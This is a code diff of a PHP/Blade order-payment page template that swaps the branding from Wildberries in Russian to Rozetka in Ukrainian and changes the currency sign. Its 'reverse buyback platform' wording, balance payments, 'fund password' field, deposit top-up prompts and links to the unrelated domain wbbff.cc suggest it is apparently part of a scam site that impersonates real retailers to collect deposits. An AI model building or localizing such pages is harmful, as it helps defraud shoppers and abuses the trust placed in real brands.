@@ -22,11 +22,11 @@
 
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-	<title>Отправить заказ - Wildberries</title>
-	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
-	<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+	<title>Відправити замовлення - Rozetka</title>
+	<meta name="keywords" content="Платформа зворотного викупу для українських торговців">
+	<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
 	<meta name="format-detection" content="telephone=no">
-	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style_002.css") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
 
@@ -44,15 +44,15 @@
 	</script>
 	<div class="pagetop">
 		<div class="fh"><a href="<?php echo route("index") ?>"></a></div>
-		<div>Отправить заказ</div>
+		<div>Відправити замовлення</div>
 		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
 
 		<div class="top_menu" id="top_menu">
 			<ul>
-				<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
+				<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
 				<li><a href="https://wbbff.cc/index.php/category"><i class="top_tb2"></i><span>Каталог</span></a></li>
-				<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
-				<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
+				<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
+				<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
 			</ul>
 			<div class="clear"></div>
 		</div>
@@ -63,21 +63,21 @@
 		<div class="content" style="margin-top:10px">
 			<div class="order_cg">
 				<i class="tjcg_dui"></i>
-				<div class="tjcg_tt">Заказ отправлен, пожалуйста, оплатите как можно скорее!</div>
+				<div class="tjcg_tt">Замовлення відправлено, будь ласка, оплатіть якомога швидше!</div>
 			</div>
 			<div class="yhq_box">
 				<div class="yhq_sel">
-					<span class="fl c666">номер заказа:</span>
+					<span class="fl c666">номер замовлення:</span>
 					<span class="fr">{{ $order->id }}</span>
 					<div class="clear"></div>
 				</div>
 				<div class="yhq_sel">
-					<span class="fl c666">Общая сумма:</span>
-					<span class="fr">₾ {{ number_format(collect($order->order_description)->sum(fn($item) => $item['quantity'] * $item['price']), 2) }}</span>
+					<span class="fl c666">Загальна сума:</span>
+					<span class="fr">₴ {{ number_format(collect($order->order_description)->sum(fn($item) => $item['quantity'] * $item['price']), 2) }}</span>
 					<div class="clear"></div>
 				</div>
 				<div class="yhq_sel">
-					<span class="fl c666">способ оплаты:</span>
+					<span class="fl c666">спосіб оплати:</span>
 					<span class="fr r_jt" style="position:relative;">
 						<span style="padding-right:15px;" onclick="app_page('page_payment');" id="payment_btn">{{ $order->method_pay }}</span>
 						<i></i>
@@ -87,24 +87,24 @@
 			</div>
 			<!--<div class="yhq_box1" id="paypw_html">
 		<div class="yhq_sel1">
-			<span class="yhq_sel1_l c666">Код оплаты：</span>
+			<span class="yhq_sel1_l c666">Код оплати：</span>
 			<span class="tjr_input">
-				<input type="text" name="user_paypw"  placeholder="Введите фонды пароль" />
+				<input type="text" name="user_paypw"  placeholder="Введіть пароль фонду" />
 			</span>
 			<div class="clear"></div>
 		</div>
 	</div>-->
 			<!-- 	<div class="zc_box2 mat10" id="user_paypw">
 		<div class="zc_list">
-			<div class="zc_name">Код оплаты：</div>
-			<div class="zc_text"><input type="password" name="user_paypw" value="" placeholder="Введите фонды пароль" /></div>
-			<a class="zc_smsyzm" href="https://wbbff.cc/user.php?mod=setting&act=paypw&fromto=https%3A%2F%2Fwbbff.cc%2Findex.php%3Fmod%3Dorder%26act%3Dpay%26id%3D240820143911191">Сброс пароля</a>
+			<div class="zc_name">Код оплати：</div>
+			<div class="zc_text"><input type="password" name="user_paypw" value="" placeholder="Введіть пароль фонду" /></div>
+			<a class="zc_smsyzm" href="https://wbbff.cc/user.php?mod=setting&act=paypw&fromto=https%3A%2F%2Fwbbff.cc%2Findex.php%3Fmod%3Dorder%26act%3Dpay%26id%3D240820143911191">Скинути пароль</a>
 		</div>
 	</div> -->
 			<div class="loginbtn" style="margin:15px 12px;">
 				<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
 				<input type="hidden" name="pesubmit">
-				<input type="button" value="подтвердить оплату" onclick="pay_btn()">
+				<input type="button" value="підтвердити оплату" onclick="pay_btn()">
 			</div>
 			<!-- 	<div class="loginbtn" style="margin:15px 12px;">
 		<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8" />
@@ -116,14 +116,14 @@
 			<!-- 	<div style="padding:20px"><div class="zc_name">温馨提示：</div>
 	<div class="zc_name">如果您选择的支付方式为转账汇款，请前往Поддержка提交转账信息！</div></div> -->
 			<div id="page_payment" class="divhide">
-				<div class="add_tt">Выберите способ оплаты</div>
+				<div class="add_tt">Виберіть спосіб оплати</div>
 				<div class="close_btn" onclick="app_page_close();"></div>
 				<div id="payment_list">
 					<label class="add_sel js_radio sel" for="order_payment_balance">
 						<input type="radio" name="order_payment" value="balance" payment_name="balance" id="order_payment_balance" class="divhide" checked="checked">
 						<div class="fl mar5" style="width:22px; overflow:hidden;"><img src="<?php echo asset("assets/logo.png") ?>" width="85"></div>
-						<div class="fl mat2">balance</div>
-						<div class="fl mat2 corg">（баланс: ₾ {{ auth()->user()->balance }} ）</div>
+						<div class="fl mat2">баланс</div>
+						<div class="fl mat2 corg">（баланс: ₴ {{ auth()->user()->balance }} ）</div>
 						<div class="dui_1"></div>
 						<div class="clear"></div>
 					</label>
@@ -134,7 +134,7 @@
 			<script type="text/javascript" src="<?php echo asset("assets/wechat.js") ?>"></script>
 			<script type="text/javascript">
 				$(function() {
-					//支付方式
+					//спосіб оплати
 					pe_select_radio('order_payment', "balance", function(json) {
 						$("#payment_btn").html($(":input[name='order_payment']:checked").attr("payment_name"));
 						app_page_close();
@@ -145,18 +145,18 @@
 						}
 					});
 				})
-				//支付提交按钮
+				//кнопка підтвердження оплати
 				function pay_btn() {
 					order_payment = $(":input[name='order_payment']:checked").val();
 					/*if (order_payment == 'balance' && $(":input[name='user_paypw']").val() == '') {
 						layer.open({
-						    content: 'Введите фонды пароль<p><input type="password" name="paypw" id="paypw" /></p>',
-						    btn: ['подтвердить оплату', '重置Код оплаты'],
+						    content: 'Введіть пароль фонду<p><input type="password" name="paypw" id="paypw" /></p>',
+						    btn: ['підтвердити оплату', 'скинути код оплати'],
 						    shadeClose: false,
 						    yes: function(){
 								var user_paypw = $('#paypw').val();
 								if (user_paypw == '') {
-									app_tip('Введите фонды пароль');
+									app_tip('Введіть пароль фонду');
 									return false;
 								}
 								$(":input[name='user_paypw']").val(user_paypw)
@@ -171,13 +171,13 @@
 					if (order_payment == 'bank') {
 						layer.open({
 							content: $("#bank_text").html(),
-							btn: '确认'
+							btn: 'підтвердити'
 						});
 						return false;
 					}
 
 					function app_submit(url, func, id) {
-						app_loading("loading...");
+						app_loading("завантаження...");
 						var form_id = typeof id == "undefined" ? "form" : id;
 						$.post(
 							url,
@@ -190,13 +190,13 @@
 									} else {
 										layer.open({
 											type: 4,
-											title: "Пополнить баланс",
+											title: "Поповнити баланс",
 											area: ['300px', '350px'],
-											fixed: false, //不固定
+											fixed: false, //не фіксований
 											shadeClose: true,
 											shade: 0.5,
-											content: "Определить сумму депозита?",
-											btn: ["Идти к", "Отмена"],
+											content: "Визначити суму депозиту?",
+											btn: ["Перейти до", "Скасувати"],
 											yes: function(index, layero) {
 												
 												window.location.href = "{{ route('deposit') }}";
@@ -233,7 +233,7 @@
 				$(function() {
 					$("img.js_imgload").scrollLoading();
 				});
-				//顶部菜单点击
+				//клік по верхньому меню
 				function top_menu() {
 					if ($("#top_menu").is(":hidden")) {
 						$("#top_menu").show();
